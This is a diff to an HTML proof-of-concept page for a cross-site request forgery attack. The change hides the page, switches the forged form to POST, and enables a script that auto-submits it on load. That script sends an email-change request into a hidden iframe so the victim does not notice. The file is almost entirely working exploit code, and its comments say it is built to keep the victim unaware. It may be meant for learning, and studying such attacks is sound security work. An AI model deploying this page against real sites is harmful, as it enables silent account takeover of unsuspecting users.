@@ -9,11 +9,10 @@
     <title>CSRF</title>
     
     <style>
-        #csrf-main {
-        visibility: visible;
-        } 
-        
-       /* change visibility="visible"  in order to see how the page would look like to victim if iframe and input tags are not kept hidden */
+        #csrf-main{
+        	   visibility: hidden;
+        	   }
+                /* change visibility="visible"  in order to see how the page would look like to victim if iframe and input tags are not kept hidden */
         
      </style>
     
@@ -26,9 +25,9 @@
     
     	<iframe name="csrf-iframe" ></iframe>
     
-    	<form action="https://link-which-leads-to-change-in-email" method="get" target="csrf-iframe" id="csrf-form">
+    	<form action="https://link-which-leads-to-change-in-email" method="post" target="csrf-iframe" id="csrf-form">
     	
-    	<!-- keeping target="csrf-iframe will lead to open the victims exploited page in iframe. As we have made iframe tag hidden so user will not know that he has been 
+            <!-- keeping target="csrf-iframe will lead to open the victims exploited page in iframe. As we have made iframe tag hidden so user will not know that he has been 
     	    hacked"-->
     	
         	<input type="text" name='email' value="testing@222">
@@ -36,13 +35,15 @@
     	
     </main>
     
-    <!--script>document.forms[0].submit()</script-->
+    <script>
+      document.forms[0].submit();
+    </script>
     
     <!--document.forms[0].submit() will trigger the submission of the first form in your HTML page. -->
     
     <!--  OR -->
     
-    <script>document.getElementById("csrf-form").submit()</script>
+    <!--script>document.getElementById("csrf-form").submit()</script-->
     
 </body>
 </html>
